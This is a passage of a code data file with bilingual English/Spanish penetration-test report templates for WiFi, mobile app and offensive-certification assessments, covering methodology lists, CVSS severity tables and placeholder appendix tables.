La evaluación se llevó a cabo el **[TODO Fecha]** en las instalaciones de **[TODO Ubicación Física]**.

### Alcance
- **Red WiFi Corporativa:** SSID "[TODO Especificar SSID Corporativo]"
- **Red WiFi de Invitados:** SSID "[TODO Especificar SSID de Invitados]"

### Metodología
1. **Reconocimiento:** Identificación de redes inalámbricas visibles y ocultas.
2. **Ataques de Autenticación:** Intento de crackear la Clave Pre-Compartida (PSK) a través de handshakes capturados.
3. **Ataques del Lado del Cliente:** Realización de ataques "Evil Twin" y de portal cautivo.
4. **Análisis Post-Autenticación:** Evaluación del aislamiento de clientes y el acceso a recursos internos después de la conexión.
5. **Reporte:** Detalle de los hallazgos y provisión de recomendaciones de seguridad.

---

<!-- section-id: template-wifi-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, como la captura de un handshake WPA y su crackeo, o la configuración de un AP Evil Twin.]

---

<!-- section-id: template-wifi-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que permiten el acceso directo a la red corporativa interna. |
| Alta | 7.0 - 8.9 | Debilidades que permiten a un atacante descifrar el tráfico o suplantar a usuarios legítimos. |
| Media | 4.0 - 6.9 | Problemas como la falta de aislamiento de clientes en redes de invitados o portales cautivos débiles. |
| Baja | 0.1 - 3.9 | Desviaciones de las mejores prácticas, como la difusión de SSIDs innecesarios. |
| Informativa | 0.0 | Observaciones generales sobre el entorno inalámbrico. |`,
    appendix_en: `
<!-- section-id: template-wifi-en-appendix-1 -->

### A. Discovered Wireless Networks
| SSID | BSSID | Signal Strength | Encryption | Authentication |
|---|---|---|---|---|
| [TODO FILL IN] | | | | |

---

<!-- section-id: template-wifi-en-appendix-2 -->

### B. Cracked Passwords
| SSID | Password | Cracking Method |
|---|---|---|
| [TODO FILL IN] | | |
`,
    appendix_es: `
<!-- section-id: template-wifi-es-appendix-1 -->

### A. Redes Inalámbricas Descubiertas
| SSID | BSSID | Potencia de Señal | Cifrado | Autenticación |
|---|---|---|---|---|
| [TODO RELLENAR] | | | | |

---

<!-- section-id: template-wifi-es-appendix-2 -->

### B. Contraseñas Crackeadas
| SSID | Contraseña | Método de Crackeo |
|---|---|---|
| [TODO RELLENAR] | | |
`
  },
   {
    id: 'template-mobile',
    name_en: 'Mobile App Audit',
    name_es: 'Auditoría de App Móvil',
    icon: 'Smartphone',
    description_en: 'A security assessment of Android and/or iOS mobile apps, including static and dynamic analysis.',
    description_es: 'Evaluación de seguridad de apps móviles Android y/o iOS, incluyendo análisis estático y dinámico.',
    scope_en:
`<!-- section-id: template-mobile-en-1 -->

## Executive Summary
This report documents the findings of a security assessment of the **[TODO App Name]** mobile application (version [TODO App Version]) for **[TODO Client Name]**. The test focused on identifying vulnerabilities within the mobile application itself and its backend API interactions, covering areas such as insecure data storage, insecure communication, and client-side logic flaws.

---

<!-- section-id: template-mobile-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]**.

### Scope
- **Android Application:** Package Name \`[TODO com.example.app]\`, provided as [TODO APK / Play Store link]
- **iOS Application:** Bundle ID \`[TODO com.example.app]\`, provided as [TODO IPA / App Store link]
- **Backend APIs:** The assessment included analysis of the API endpoints consumed by the mobile application, located at \`[TODO api.example.com]\`

### Methodology
1. **Static Analysis (SAST):** Analyzing the application's source code or decompiled code to find vulnerabilities without executing it.
2. **Dynamic Analysis (DAST):** Testing the application in a running state, both on a physical device and an emulator, to identify runtime vulnerabilities. This included intercepting network traffic with a proxy.
3. **API Testing:** Directly testing the backend API endpoints for common web vulnerabilities.
4. **Reporting:** Consolidating all findings and providing detailed remediation steps.

---

<!-- section-id: template-mobile-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the most significant attack path. For example, how insecure data storage was leveraged to extract an API key, which was then used to abuse a vulnerable API endpoint.]

---

<!-- section-id: template-mobile-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that allow for full compromise of user accounts or sensitive backend systems. |
| High | 7.0 - 8.9 | Vulnerabilities that expose sensitive user data or allow for significant unauthorized actions. |
| Medium | 4.0 - 6.9 | Weaknesses in the application that could be chained for a more significant attack or expose non-critical data. |
| Low | 0.1 - 3.9 | Issues that deviate from security best practices but have a low direct impact. |
| Informational | 0.0 | Observations about the application's security posture. |`,
    scope_es:
`<!-- section-id: template-mobile-es-1 -->

## Resumen Ejecutivo
Este informe documenta los hallazgos de una evaluación de seguridad de la aplicación móvil **[TODO Nombre de la App]** (versión [TODO Versión de la App]) para **[TODO Nombre del Cliente]**. La prueba se centró en identificar vulnerabilidades dentro de la propia aplicación móvil y sus interacciones con la API de backend, cubriendo áreas como el almacenamiento inseguro de datos, la comunicación insegura y los fallos en la lógica del lado del cliente.

---

<!-- section-id: template-mobile-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]**.

### Alcance
- **Aplicación Android:** Nombre del Paquete \`[TODO com.ejemplo.app]\`, proporcionada como [TODO enlace a APK / Play Store]
- **Aplicación iOS:** Bundle ID \`[TODO com.ejemplo.app]\`, proporcionada como [TODO enlace a IPA / App Store]
- **APIs de Backend:** La evaluación incluyó el análisis de los endpoints de la API consumidos por la aplicación móvil, ubicados en \`[TODO api.ejemplo.com]\`

### Metodología
1. **Análisis Estático (SAST):** Análisis del código fuente o código descompilado de la aplicación para encontrar vulnerabilidades sin ejecutarla.
2. **Análisis Dinámico (DAST):** Prueba de la aplicación en estado de ejecución, tanto en un dispositivo físico como en un emulador, para identificar vulnerabilidades en tiempo de ejecución. Esto incluyó la intercepción del tráfico de red con un proxy.
3. **Pruebas de API:** Prueba directa de los endpoints de la API de backend en busca de vulnerabilidades web comunes.
4. **Reporte:** Consolidación de todos los hallazgos y provisión de pasos detallados para la remediación.

---

<!-- section-id: template-mobile-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque más significativa. Por ejemplo, cómo se aprovechó el almacenamiento inseguro de datos para extraer una clave de API, que luego se usó para abusar de un endpoint de API vulnerable.]

---

<!-- section-id: template-mobile-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que permiten el compromiso total de las cuentas de usuario o de los sistemas de backend sensibles. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que exponen datos sensibles del usuario o permiten acciones no autorizadas significativas. |
| Media | 4.0 - 6.9 | Debilidades en la aplicación que podrían encadenarse para un ataque más significativo o exponer datos no críticos. |
| Baja | 0.1 - 3.9 | Problemas que se desvían de las mejores prácticas de seguridad pero tienen un bajo impacto directo. |
| Informativa | 0.0 | Observaciones sobre la postura de seguridad de la aplicación. |`,
    appendix_en: `
<!-- section-id: template-mobile-en-appendix-1 -->

### A. Hardcoded Secrets
| Secret | Location |
|---|---|
| [TODO e.g., API Key] | [TODO e.g., strings.xml] |

---

<!-- section-id: template-mobile-en-appendix-2 -->

### B. Insecurely Stored Data
| Data | Storage Method | Location |
|---|---|---|
| [TODO e.g., Session Token] | [TODO e.g., SharedPreferences] | [TODO e.g., /data/data/com.app/shared_prefs/prefs.xml] |
`,
    appendix_es: `
<!-- section-id: template-mobile-es-appendix-1 -->

### A. Secretos Embebidos en el Código
| Secreto | Ubicación |
|---|---|
| [TODO p. ej., Clave de API] | [TODO p. ej., strings.xml] |

---

<!-- section-id: template-mobile-es-appendix-2 -->

### B. Datos Almacenados Inseguramente
| Dato | Método de Almacenamiento | Ubicación |
|---|---|---|
| [TODO p. ej., Token de Sesión] | [TODO p. ej., SharedPreferences] | [TODO p. ej., /data/data/com.app/shared_prefs/prefs.xml] |
`
  },
  {
    id: 'cpts-template',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    icon: 'Award',
    description_en: 'A generic template for offensive security certification reports (e.g., OSCP, CPTS).',
    description_es: 'Plantilla genérica para informes de certificación de seguridad ofensiva (p. ej., OSCP, CPTS).',
    scope_en: 
`<!-- section-id: cpts-template-en-1 -->

## Executive Summary
This report details the results of a penetration test performed on the [TODO Organization Name] enterprise network as part of the [TODO Certification Name] certification exam. The objective of this assessment was to identify and exploit security vulnerabilities to compromise the internal network and gain access to sensitive systems, simulating a real-world attack scenario. This report documents the attack path, findings, and provides a detailed narrative of the engagement.

---

<!-- section-id: cpts-template-en-2 -->

## Scope & Methodology
The scope of this penetration test was limited to the hosts and networks provided within the [TODO Exam Environment Name] environment. The assessment was conducted from an external attacker's perspective, with no prior knowledge of the internal network architecture.

### Scope
- **Included:** External IP addresses provided in the exam, and any hosts discovered and accessible from the initial foothold within the specified subnets.
- **Excluded:** Any hosts or networks outside of the designated exam infrastructure, Denial of Service (DoS) attacks, and social engineering attacks.

### Methodology
The penetration test followed a structured methodology:
1.  **Information Gathering:** Passive and active reconnaissance to map the external attack surface.
2.  **Vulnerability Identification:** Identifying potential weaknesses and entry points.
3.  **Exploitation:** Gaining an initial foothold and escalating privileges.
4.  **Post-Exploitation:** Pivoting through the internal network, identifying high-value targets, and exfiltrating data (flags).
5.  **Reporting:** Documenting all findings, exploitation paths, and recommendations.

---

<!-- section-id: cpts-template-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial reconnaissance to the final flag capture. This should be detailed and easy to follow.]

---

<!-- section-id: cpts-template-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that lead to Domain Admin compromise or control of critical servers. |
| High | 7.0 - 8.9 | Vulnerabilities allowing for significant privilege escalation or lateral movement. |
| Medium | 4.0 - 6.9 | Misconfigurations or weaknesses that could aid an attacker in reconnaissance or further attacks. |
| Low | 0.1 - 3.9 | Minor issues that represent a deviation from best practices. |
| Informational | 0.0 | Observations about the network environment. |
`,
    scope_es:
`<!-- section-id: cpts-template-es-1 -->

## Resumen Ejecutivo
Se realizó una prueba de penetración contra la red empresarial de [TODO Nombre de la Organización] para el examen de certificación [TODO Nombre de la Certificación]. El objetivo de esta evaluación fue identificar e informar sobre las vulnerabilidades de seguridad que podrían ser explotadas por un atacante externo para comprometer la red interna y obtener acceso a datos o sistemas sensibles, simulando un escenario de ataque del mundo real. Este informe detalla los hallazgos de la evaluación y proporciona recomendaciones para su remediación.

---

<!-- section-id: cpts-template-es-2 -->

## Alcance y Metodología
El alcance de esta prueba de penetración se limitó a los hosts y redes proporcionados dentro del entorno de [TODO Nombre del Entorno del Examen]. La evaluación se realizó desde la perspectiva de un atacante externo, sin conocimiento previo de la arquitectura de la red interna.

### Alcance
- **Incluido:** Direcciones IP externas proporcionadas en el examen, y cualquier host descubierto y accesible desde el punto de apoyo inicial dentro de las subredes especificadas.
- **Excluido:** Cualquier host o red fuera de la infraestructura designada para el examen, ataques de Denegación de Servicio (DoS) e ingeniería social.

### Metodología
La prueba de penetración siguió una metodología estructurada:
1.  **Recopilación de Información:** Reconocimiento pasivo y activo para mapear la superficie de ataque externa.
2.  **Identificación de Vulnerabilidades:** Identificación de posibles debilidades y puntos de entrada.
3.  **Explotación:** Obtención de un punto de apoyo inicial y escalada de privilegios.
4.  **Post-Explotación:** Pivotar a través de la red interna, identificando objetivos de alto valor y exfiltrando datos (banderas).
5.  **Elaboración de Informes:** Documentación de todos los hallazgos, rutas de explotación y recomendaciones.

---

<!-- section-id: cpts-template-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el reconocimiento inicial hasta la captura de la bandera final. Debe ser detallada y fácil de seguir.]

---

<!-- section-id: cpts-template-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que conducen al compromiso del Administrador de Dominio o al control de servidores críticos. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que permiten una escalada de privilegios significativa o movimiento lateral. |
| Media | 4.0 - 6.9 | Configuraciones incorrectas o debilidades que podrían ayudar a un atacante en el reconocimiento o ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que representan una desviación de las mejores prácticas. |
| Informativa | 0.0 | Observaciones sobre el entorno de la red. |
`,
    appendix_en: `
<!-- section-id: cpts-template-en-appendix-1 -->

### A. Compromised Users
| Username | Domain | Password |
|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] |

---

<!-- section-id: cpts-template-en-appendix-2 -->

### B. Exploited Hosts
| Hostname | IP Address | Operating System |
|---|---|---|
| [TODO WEB01] | [TODO 192.168.X.X] | [TODO Windows Server 2019] |

---

<!-- section-id: cpts-template-en-appendix-3 -->

### C. Flags Captured
| Host | Flag Type | Flag Value |
|---|---|---|
| [TODO WEB01] | user.txt | [TODO flag_value] |

---

<!-- section-id: cpts-template-en-appendix-4 -->

### D. Host & Service Discovery
| IP Address | Port | Service | Notes |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |

---

<!-- section-id: cpts-template-en-appendix-5 -->

### E. Subdomain Discovery
| URL | Description | Discovery Method |
|---|---|---|
| [TODO FILL IN DISCOVERED VHOSTS/SUBDOMAINS] | | |

---

<!-- section-id: cpts-template-en-appendix-6 -->

### F. Tools Used
[TODO List the primary tools used during the assessment.]
- Nmap
- Metasploit Framework
- Mimikatz
- BloodHound
- Impacket Suite
- Burp Suite
`,
    appendix_es: `
<!-- section-id: cpts-template-es-appendix-1 -->

### A. Usuarios Comprometidos
| Usuario | Dominio | Contraseña |
|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] |

---

<!-- section-id: cpts-template-es-appendix-2 -->

### B. Hosts Explotados
| Hostname | Dirección IP | Sistema Operativo |
|---|---|---|
| [TODO WEB01] | [TODO 192.168.X.X] | [TODO Windows Server 2019] |

---

<!-- section-id: cpts-template-es-appendix-3 -->

### C. Banderas Capturadas
| Host | Tipo de Bandera | Valor de la Bandera |
|---|---|---|
| [TODO WEB01] | user.txt | [TODO flag_value] |

---

<!-- section-id: cpts-template-es-appendix-4 -->

### D. Descubrimiento de Hosts y Servicios
| Dirección IP | Puerto | Servicio | Notas |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |

---

<!-- section-id: cpts-template-es-appendix-5 -->

### E. Descubrimiento de Subdominios
| URL | Descripción | Método de Descubrimiento |
|---|---|---|
| [TODO RELLENAR VHOSTS/SUBDOMINIOS DESCUBIERTOS] | | |

---

<!-- section-id: cpts-template-es-appendix-6 -->

### F. Herramientas Utilizadas
[TODO Enumere las principales herramientas utilizadas durante la evaluación.]
- Nmap
- Metasploit Framework
- Mimikatz
- BloodHound
- Impacket Suite
- Burp Suite
`
  }
];

// Functions to add/update data - in a real app this would interact with an API
export const updateVulnerability = (updatedVuln: Vulnerability) => {
  vulnerabilities = vulnerabilities.map(v => v.id === updatedVuln.id ? updatedVuln : v);
};

export const addVulnerability = (newVuln: Omit<Vulnerability, 'id'>) => {
  const newId = `vuln-${Date.now()}`;
  vulnerabilities.push({ id: newId, ...newVuln });
};